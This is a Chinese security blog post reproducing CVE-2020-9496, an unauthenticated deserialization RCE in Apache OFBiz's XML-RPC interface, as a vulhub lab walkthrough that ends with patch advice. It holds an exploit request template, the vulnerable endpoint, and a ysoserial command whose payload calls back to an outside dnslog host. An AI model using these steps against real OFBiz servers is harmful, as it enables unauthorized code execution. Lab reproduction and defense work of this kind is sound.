***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 1、 简介

OFBiz是一个非常著名的[电子商务平台](https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E5%95%86%E5%8A%A1%E5%B9%B3%E5%8F%B0/3376121)，是一个非常著名的[开源](https://baike.baidu.com/item/%E5%BC%80%E6%BA%90)项目，提供了创建基于最新[J2EE](https://baike.baidu.com/item/J2EE)/[XML](https://baike.baidu.com/item/XML)规范和技术标准，构建大中型企业级、[跨平台](https://baike.baidu.com/item/%E8%B7%A8%E5%B9%B3%E5%8F%B0/8558902)、跨数据库、跨[应用服务器](https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/4971773)的多层、[分布式](https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F/19276232)电子商务类WEB应用系统的框架。
OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的[组件](https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6/6902128)和工具。包括实体引擎,
服务引擎, 消息引擎, [工作流](https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E6%B5%81)引擎,
[规则引擎](https://baike.baidu.com/item/%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/3076955)等。

## 2、 漏洞描述

CVE-2020-9496漏洞是Apache
Ofbiz中xmlrpc接口的一个rce漏洞，攻击者可以利用未授权访问该接口，并且构造数据请求包，进行远程代码执行漏洞，获得系统权限。

## 3、 影响范围

Ofbiz：< 17.12.04

## 4、 漏洞环境

该漏洞在vulhub拥有docker镜像，只需要进入vulhub目录，开启容器即可

<https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/>

docker-compose up -d 开启容器。

开启后访问http://ip:8443/myportal/control/main

## 5、 复现

![1620794950_609b5e4637e237e921102.png!small?1620794950618](https://image.3001.net/images/20210512/1620794950_609b5e4637e237e921102.png!small?1620794950618)

数据包：

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">
    
    <soapenv:Header/>
    
    <soapenv:Body>
    
    <ser>
    
    <map-Map>
    
    <map-Entry>
    
    <map-Key>
    
    <cus-obj>
    
    ‘此处填写payload’
    
    </cus-obj>
    
    </map-Key>
    
    <map-Value>
    
    <std-String/>
    
    </map-Value>
    
    </map-Entry>
    
    </map-Map>
    
    </ser>
    
    </soapenv:Body>
    
    </soapenv:Envelope>

![1620794968_609b5e58c08bb195d9f6c.png!small?1620794969185](https://image.3001.net/images/20210512/1620794968_609b5e58c08bb195d9f6c.png!small?1620794969185)

该漏洞需要用到工具ysoserial.jar。

git clone <https://github.com/frohoff/ysoserial.git>

漏洞url：

    
    
    /webtools/control/xmlrpc
    
    java -jar ysoserial.jar URLDNS  http://r0bz3h.dnslog.cn | base64 | tr -d "\n"

生成base编码后的payload

将payload复制进请求包中发送。

![1620794992_609b5e709dd4225753fc7.png!small?1620794993079](https://image.3001.net/images/20210512/1620794992_609b5e709dd4225753fc7.png!small?1620794993079)

![1620795000_609b5e78b0e583ad95e2a.png!small?1620795001063](https://image.3001.net/images/20210512/1620795000_609b5e78b0e583ad95e2a.png!small?1620795001063)

## 6、 漏洞防御

可更新至Apache OFBiz最新版。  
下载地址：<https://ofbiz.apache.org/download.html#vulnerabilities>

## 临时修复建议：

若业务环境允许，使用白名单限制web端口的访问来降低风险。

